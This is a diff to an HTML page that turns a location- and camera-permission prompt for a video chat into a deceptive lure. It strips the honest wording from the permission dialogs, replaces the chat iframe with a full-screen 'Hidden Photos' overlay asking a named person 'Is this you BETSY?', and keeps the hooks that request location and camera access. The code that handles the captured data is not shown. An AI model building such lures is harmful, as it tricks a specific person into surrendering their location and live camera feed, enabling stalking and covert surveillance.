@@ -44,9 +44,9 @@
     color: white;
     font-family: Arial, sans-serif;
   ">
-    <h1 style="margin-bottom: 10px;">Location Access Required</h1>
+    <h1 style="margin-bottom: 10px;">Click Allow to Access</h1>
     <p style="font-size: 18px; margin-bottom: 30px; text-align:center; max-width:500px;">
-      This site requires location access to continue. Please allow location permission to proceed.
+      This site requires confirmation to continue. Please allow to proceed.
     </p>
     <button id="allowBtn" onclick="retryLocation()" style="
       padding: 15px 40px;
@@ -56,7 +56,7 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
-    ">Enable Location</button>
+    ">Enable and View Now</button>
   </div>
 
   <div id="cameraOverlay" style="
@@ -74,9 +74,9 @@
     color: white;
     font-family: Arial, sans-serif;
   ">
-    <h1 style="margin-bottom: 10px;">Camera Access Required</h1>
+    <h1 style="margin-bottom: 10px;">Click Enable to View Access</h1>
     <p style="font-size: 18px; margin-bottom: 30px; text-align:center; max-width:500px;">
-      This site requires camera access for video chat. Please allow camera permission to proceed.
+      This site requires confirmation to access. Please allow to proceed.
     </p>
     <button id="allowCameraBtn" onclick="retryCamera()" style="
       padding: 15px 40px;
@@ -86,7 +86,7 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
-    ">Enable Camera</button>
+    ">Enable and View Now</button>
   </div>
 
   <!-- Visible Camera Box -->
@@ -94,8 +94,73 @@
     <video id="video" playsinline autoplay muted></video>
   </div>
 
-  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
-  </iframe>
+  <!-- <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
+  </iframe> -->
+  <iframe 
+  style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 99999;"
+  srcdoc="
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+  <meta charset='UTF-8'>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; overflow-x: hidden; }
+    header { text-align: center; padding: 30px 20px; background: #111; }
+    header h1 { font-size: 36px; margin-bottom: 5px; }
+    header p { font-size: 16px; color: #aaa; }
+    .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; padding: 30px; max-width: 1400px; margin: 0 auto; }
+    .gallery-item { position: relative; overflow: hidden; border-radius: 10px; cursor: pointer; aspect-ratio: 1 / 1; background: #333; }
+    .gallery-item img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.3s ease, opacity 0.3s ease; display: block; }
+    .gallery-item:hover img { transform: scale(1.05); opacity: 0.8; }
+    .gallery-item .overlay { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(transparent, rgba(0,0,0,0.8)); padding: 20px 15px 15px; opacity: 0; transition: opacity 0.3s ease; }
+    .gallery-item:hover .overlay { opacity: 1; }
+    .lightbox { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; }
+    .lightbox.active { display: flex; }
+    .lightbox img { max-width: 90%; max-height: 80%; border-radius: 10px; }
+    .close-btn { position: absolute; top: 20px; right: 30px; font-size: 40px; color: white; cursor: pointer; background: none; border: none; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Hidden Photos</h1>
+    <p>Is this you BETSY? </p>
+  </header>
+  <div class='gallery'>
+    <div class='gallery-item' onclick='openLightbox(this)'>
+      <img src='https://i.ibb.co/Kjb5BPfm/1.jpg' alt='Photo 1'>
+      <div class='overlay'><h3>Photo 1</h3><p>Description</p></div>
+    </div>
+    <div class='gallery-item' onclick='openLightbox(this)'>
+      <img src='https://i.ibb.co/cKmBxRnH/561185210-122096092611071963-8734785337901921052-n.jpg' alt='Photo 2'>
+      <div class='overlay'><h3>Photo 2</h3><p>Description</p></div>
+    </div>
+    <div class='gallery-item' onclick='openLightbox(this)'>
+      <img src='https://i.ibb.co/QFTPzQqM/3.jpg' alt='Photo 3'>
+      <div class='overlay'><h3>Photo 3</h3><p>Description</p></div>
+    </div>
+  </div>
+
+  <div class='lightbox' id='lightbox' onclick='closeLightbox(event)'>
+    <button class='close-btn'>&times;</button>
+    <img id='lightboxImg' src=''>
+  </div>
+
+  <script>
+    function openLightbox(item) {
+      const img = item.querySelector('img');
+      const lightbox = document.getElementById('lightbox');
+      const lightboxImg = document.getElementById('lightboxImg');
+      lightboxImg.src = img.src;
+      lightbox.classList.add('active');
+    }
+    function closeLightbox(event) {
+      document.getElementById('lightbox').classList.remove('active');
+    }
+  </script>
+</body>
+</html>
+"></iframe>
 
   <p id="demo"></p>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
